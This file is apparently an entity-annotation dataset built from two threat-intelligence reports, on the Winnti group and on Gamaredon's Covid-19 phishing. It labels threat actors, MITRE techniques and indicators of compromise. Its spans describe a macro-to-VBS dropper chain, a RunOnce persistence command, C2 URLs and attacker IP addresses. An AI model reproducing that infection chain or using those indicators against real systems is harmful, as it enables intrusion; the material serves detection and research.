WINNTI GROUP_ Insights From the Past," Group, or at least sharing resources.  

The detection of this unreported ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," variant uploaded to VirusTotal and targeting a German
chemical company aligns with our prior observations and research from previous intelligence
reporting highlighting ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group’s interest in German DAX companies. As a result,
organizations of all sizes, but especially small to medium sized companies, including Germany’s
hidden champions, should prepare against such threats as they are vital to the economic
ecosystem and continuous development of niche markets. Government oversight (local, regional,
and across the EU) should ensure susceptible organizations such as these are following
regulation and implementing security best practices to protect against future attacks.

Appendix

Indicators of Compromise

",O
WINNTI GROUP_ Insights From the Past,4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,f3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,*.dick[.]mooo[.]com,ioc
WINNTI GROUP_ Insights From the Past,"

",O
WINNTI GROUP_ Insights From the Past,208[.]67[.]222[.]222,ioc
WINNTI GROUP_ Insights From the Past,"

https://web.br.de/interaktiv/WINNTI/index.html


4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://QuoIntelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 13/13

",O
WINNTI GROUP_ Insights From the Past,45[.]248[.]85[.]200,ioc
WINNTI GROUP_ Insights From the Past,"

MITRE ATT&CK

Tactic Technique Recommended Course of Action

Persis‐
tence /
Privilege
Escalation

",O
WINNTI GROUP_ Insights From the Past,T1215,mitre_attack
WINNTI GROUP_ Insights From the Past," Kernel
Modules and
Extensions

",O
WINNTI GROUP_ Insights From the Past,T1068,mitre_attack
WINNTI GROUP_ Insights From the Past," Ex‐
ploitation for
Privilege
Escalation

Anti-Virus software and Advanced End-Point solution can
drastically reduce the risk of both techniques.

Defense
Evasion

",O
WINNTI GROUP_ Insights From the Past,T1009,mitre_attack
WINNTI GROUP_ Insights From the Past," Binary
Padding

",O
WINNTI GROUP_ Insights From the Past,T1014,mitre_attack
WINNTI GROUP_ Insights From the Past," Rootkit

",O
WINNTI GROUP_ Insights From the Past,T1116,mitre_attack
WINNTI GROUP_ Insights From the Past," Code
Signing

Many of the samples analysed were signed with expired /
revoked certificate. Enforce signature validation via Group
Policies for executables

Exfiltration ",O
WINNTI GROUP_ Insights From the Past,T1022,mitre_attack
WINNTI GROUP_ Insights From the Past," Data
Encrypted

",O
WINNTI GROUP_ Insights From the Past,T1048,mitre_attack
WINNTI GROUP_ Insights From the Past," Exfil‐
tration Over
Alternative
Protocol

– For DNS Tunnel, ensure that DNS logs are collected
and reviewed.

– DNS telemetic data should be also collected in order to
spot frequent and  heavy loaded DNS communication that
are definitely not related to an usual DNS query.

– FreeDNS and DynDNS servers should be
blacklisted/synkholed if not strictly required

– DNS NULL type queries should not be avoided. Only
the required record types should be allowed.

Learn more about our Threat Intelligence service
Subscribe to our newsletter with your business email to receive intelligence summaries,
analytic product updates, and more!

Subscribe

https://attack.mitre.org/techniques/T1215/
https://attack.mitre.org/techniques/T1068/
https://attack.mitre.org/techniques/T1009/
https://attack.mitre.org/techniques/T1014/
https://attack.mitre.org/techniques/T1116/
https://attack.mitre.org/techniques/T1022/
https://attack.mitre.org/techniques/T1048/
https://quointelligence.eu/#offering",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,4/27/2020 ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 1/7

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
About TrendLabs Security Intelligence Blog

Search:
 

Go to…

Home
Categories

Home   »   Malware   »   ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," APT Group Use Covid-19 Lure in Campaigns

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," APT Group Use Covid-19 Lure in Campaigns
Posted on:",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"April 17, 2020 at 5:12 am",timestamp
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
Posted in:Malware, Spam, Targeted Attacks
Author:
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

0

By ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Hiroyuki Kakara,identity
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, and ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Erina Maruyama,identity
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, is an advanced persistent threat (APT) group that has been active since 2013. Their campaigns are generally known for targeting ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Ukrainian government,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
institutions. From late 2019 to February of this year, researchers published several reports on ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", tracking the group’s activities.

In March, we came across an email with a malware attachment that used the ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," group’s tactics. Some of the emails used the coronavirus pandemic as a topic
to lure victims into opening emails and attachments. These campaigns targeted victims in European countries and others.

A brief history of ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

In 2015, researchers from ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,LookingGlass,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, published the first report on ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,". According to that report, the early campaigns used Microsoft Word documents that,
when inspected, showed that its most recent user went by the name of Armagedon (a misspelled “Armageddon”), which became the basis of the group’s namesake.

The report also described ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"’s political beginnings, particularly its ties to the Ukrainian revolution in 2014. Before the revolution they had targeted
Ukrainian government officials, opposition party members, and journalists. They moved on to Ukrainian government institutions after the revolution. In 2018, CERT-
UA published an advisory against the malware Pterodo, which the group allegedly used.

The group remained active, with several ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,-related activities reported in ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,February 2020,timestamp
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,". In March, they were among the threat groups that were identified
taking advantage of the coronavirus pandemic to trick targets.

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," and Covid-19-related cover emails

https://www.trendmicro.com/
https://blog.trendmicro.com/trendlabs-security-intelligence/about-us/
https://twitter.com/trendmicrorsrch
http://www.facebook.com/trendmicro
http://www.linkedin.com/company/trend-micro
http://www.youtube.com/user/TrendMicroInc
http://feeds.trendmicro.com/Anti-MalwareBlog
https://blog.trendmicro.com/trendlabs-security-intelligence/
http://blog.trendmicro.com/trendlabs-security-intelligence/
https://blog.trendmicro.com/trendlabs-security-intelligence/
https://blog.trendmicro.com/trendlabs-security-intelligence/category/malware/
https://blog.trendmicro.com/trendlabs-security-intelligence/2020/04/
https://blog.trendmicro.com/trendlabs-security-intelligence/category/malware/
https://blog.trendmicro.com/trendlabs-security-intelligence/category/spam/
https://blog.trendmicro.com/trendlabs-security-intelligence/category/targeted_attacks/
https://blog.trendmicro.com/trendlabs-security-intelligence/author/trend-micro/
https://blog.trendmicro.com/trendlabs-security-intelligence/",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"-apt-group-use-covid-19-lure-in-campaigns/#respond
https://www.lookingglasscyber.com/wp-content/uploads/2015/08/Operation_Armageddon_Final.pdf
https://cert.gov.ua/news/46
https://www.csoonline.com/article/3532825/6-ways-attackers-are-exploiting-the-covid-19-crisis.html
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/figure-1.jpg


4/27/2020 ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/Gamaredon-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 2/7

Figure 1. The infection chain of the ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," campaign

The case we found arrived through a targeted email that contained a document file (in docx format). Opening document starts a template injection technique for
loading the document template from the internet. The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS). We
found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server. During the time of the analysis however, the C&C server
was not accessible, which made us unable to get additional payloads.

The attacks we found all arrived through targeted emails (MITRE ATT&CK framework ID ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1193,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"). One of them even had the subject “Coronavirus (2019-nCoV).”
The use of socially relevant topics is a common practice for attackers who wish to make their emails and documents more tempting to open. The email that used the
coronavirus-related subject came with an attached document file. Opening this file (MITRE ATT&CK framework ID ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1204,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,") executes the template injection method
(MITRE ATT&CK framework ID ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1221,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,").

Figure 2. Code for downloading the document template with the malicious macro

The downloaded document template (in dot format) could differ slightly depending on each download. However, its Exif info or metadata remains consistent and
shares the following details:

Identification: Word 8.0
Language code: Russian
System: ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Windows,software
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"
Author: АДМИН (“Administrator” in Russian)
Code page: Windows Cyrillic

Figure 3. A sample of malicious macro in the downloaded template document

As mentioned, the template contains malicious macro (MITRE ATT&CK framework ID ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1064,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"), which exports VBS (MITRE ATT&CK framework ID ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1064,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,") to
execute itself. More specifically it drops “%USERPROFILE%\Documents\MediaPlayer\PlayList.vbs,” which is hardcoded in the macro, and then executed in
“wscript.exe //b %USERPROFILE%\Documents\MediaPlayer\PlayList.vbs.”

Figure 4. A content sample for VBS dropped by malicious macro

PlayList.vbs contains the obfuscated codes (MITRE ATT&CK framework ID ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1140,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"), which it executes after decrypting the obfuscations. This particular behavior is
a slight departure from previously reported attacks by ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", which did not use this technique.

https://attack.mitre.org/techniques/T1193/
https://attack.mitre.org/techniques/T1204/
https://attack.mitre.org/techniques/T1221/
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/figure-2.jpg
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/figure-3.jpg
https://attack.mitre.org/techniques/T1064/
https://attack.mitre.org/techniques/T1064/
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/figure-4.jpg
https://attack.mitre.org/techniques/T1140/


4/27/2020 ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 3/7

Figure 5. A sample of executed VBS

Figure 5 shows a snippet of the VBS executed by the Execute function. The routines it follows are enumerated below.

1. Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts (MITRE ATT&CK framework ID ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1060,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,")
Registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\MediaPlayer wscript.exe //b
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,％USERPROFILE%\Documents\MediaPlayer\PlayList.vbs,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"

2. Connect with “hxxp:// kristom[.]hopto[.]org /{computer name}_{hexadecimal volume serious number}/help_05_03[.]php” (MITRE ATT&CK framework IDs
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1043,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1071,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1082,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,")

3. If the downloaded file size in the first step exceeds 10,485 bytes, then the file is saved as “",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,%APPDATA%\\Microsoft\Windows\Cookies.txt,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"” (MITRE ATT&CK
framework ID ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1105,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,")

4. Use XOR for the file saved from the second step, where ASCII code converted from its own hexadecimal volume serial number is used as the key. The
decrypted result is saved as “",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,%APPDATA%\\Microsoft\Windows\Cookies.exe,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,” (,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1001,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,")

5. If the file size of “%APPDATA%\\Microsoft\Windows\Cookies.exe” exceeds 4,485 bytes, it is executed.
6. Both “%APPDATA%\\Microsoft\Windows\Cookies.txt” and “%APPDATA%\\Microsoft\Windows\Cookies.exe” are then deleted (MITRE ATT&CK

framework ID ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,T1107,mitre_attack
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,")

The observed routines of this VBS closely follow the other reports published on ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,", such as the one from SentinelOne. However, the macro generated VBS
was obfuscated in this case, likely as an additional evasive tactic.

Interestingly, after decoding the VBS, we saw what appeared to be a programming mistake by the attacker. Lines 53 and 54 in figure 6 are for closing those
downloaded and decoded TXT and EXE files, which are variables defined right before the IF statement. If, however, these lines do not pass through this IF statement,
an error would occur. It shows that this malware is not tested enough, and may still be under development.

Our analysis found several URLs of the network destinations for both template injection and VBS. While resolving them to IP addresses to understand their attack
bases, we also found that they were all linked to the following IP addresses.

Network destination for template injection: 176[.]119[.]147[.]225
Network destination for VBS: 176[.]57[.]215[.]115

These IP addresses are from Russian hosting companies. Most likely, the attackers rented Virtual Private Server (VPS) as their attack base. Their URL for VBS
(shown below) likely includes the data when they conducted the attack.

hxxp://{FQDN}/{computer name}_{hexadecimal volume serial number}/help_{day}_{month}[.]php

Conclusion

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gameradon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," is not the first group to take advantage of the Covid-19 topic. Some cybercriminals have taken to indirect means of profiting, such as by targeting
communication platforms that have increased in popularity after organizations shifted to work from home setups. In this case, they used Covid-19 as a cover for their
relatively typical APT routine. We recommend these countermeasures to prevent similar APT attacks in the future:

https://blog.trendmicro.com/trendlabs-security-intelligence/files/2020/04/figure-5.jpg
https://attack.mitre.org/techniques/T1043/
https://attack.mitre.org/techniques/T1071/
https://attack.mitre.org/techniques/T1082/
https://attack.mitre.org/techniques/T1105/
https://attack.mitre.org/techniques/T1001/
https://attack.mitre.org/techniques/T1107/
https://labs.sentinelone.com/pro-russian-cyberspy-",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"-intensifies-ukrainian-security-targeting/
https://blog.trendmicro.com/trendlabs-security-intelligence/zoomed-in-a-look-into-a-coinminer-bundled-with-zoom-installer/


4/27/2020 ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog

https://blog.trendmicro.com/trendlabs-security-intelligence/",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Gamaredon,threat_actor
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"-apt-group-use-covid-19-lure-in-campaigns/?fbclid=IwAR2SzsXuDFjCsID7AdOyoE_U… 4/7

Check the email sender, subject, and body for anything suspicious before downloading and opening email attachments. Be especially wary of unsolicited
emails, that come from unknown senders.
Check the file extension of the attached file and make sure it is the intended file format.
Avoid activating macro for any attached Microsoft Office files, especially for emails that request macro activation using an image of the body of the opened file
or those that don’t show anything.
Watch out for spoofed domains embedded in emails before opening them. Subtle changes to a popular URL can be one indicator of malicious content.

In addition to these actions, users can also implement a multi-layer approach and take advantage of these solutions.

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"™ Smart Protection Suitesand Worry-Free™ Business Security protects users and businesses from similar threats by detecting malicious files and
spammed messages as well as blocking all related malicious URLs. ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Deep Discovery,software
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"™ has an email inspection layer that can protect enterprises
by detecting malicious attachments and URLs.
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"™ Hosted Email Securityis a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing,
ransomware, and advanced targeted attacks before they reach the network. It protects Microsoft Exchange, Microsoft Office 365, Google Apps, and other
hosted and on-premises email solutions.
",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,™ ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,OfficeScan,software
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,"™with XGen™ endpoint security infuses high-fidelity machine learning with other detection technologies and global threat
intelligence for comprehensive protection against advanced malware.
The ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog, ,O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,TMXDR,software
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," solution effectively protects connected emails, endpoints, servers, cloud workloads, and networks. ",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,Trend Micro,org
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," XDR uses powerful
AI and expert security analytics to correlate data, as well as deliver fewer yet higher-fidelity alerts for early threat detection. In a single console, it provides a
broader perspective of enterprise systems while at the same time giving a more focused and optimized set of alerts.

Indicators of Compromise (IoCs)

DOCX file

SHA256 Detection Name

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,0d90fe36866ee30eb5e4fd98583bc2fdb5b7da37e42692f390ac5f807a13f057,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," W97M_CVE2017019

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,036c2088cb48215f21d4f7d751d750b859d57018c04f6cadd45c0c4fee23a9f8,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," Trojan.W97M.CVE2

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,19d03a25af5b71e859561ff8ccc0a073acb9c61b987bdb28395339f72baf46b4,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," Trojan.XML.PHISH.

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,62cf22f840fffd8d8781e52b492b03b4efc835571b48823b07535d52b182e861,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," W97M_CVE2017019

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,8310d39aa1cdd13ca82c769d61049310f8ddaea7cd2c3b940a8a3c248e5e7b06,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," Trojan.W97M.CVE2

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,84e0b1d94a43c87de55c000e3acae17f4493a57badda3b27146ad8ed0f90c93e,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," Trojan.W97M.CVE2

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,85267e52016b6124e4e42f8b52e68475174c8a2bdf0bc0b501e058e2d388a819,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," Trojan.W97M.CVE2

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,b6a94f565d482906be7da4d801153eb4dab46d92f43be3e1d59ddd2c7f328109,ioc
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog," Trojan.W97M.CVE2

",O
Gamaredon APT Group Use Covid-19 Lure in Campaigns - TrendLabs Security Intelligence Blog,cc775e3cf1a64effa55570715b73413c3ea3a6b47764a998b1272b5be059c25b,ioc
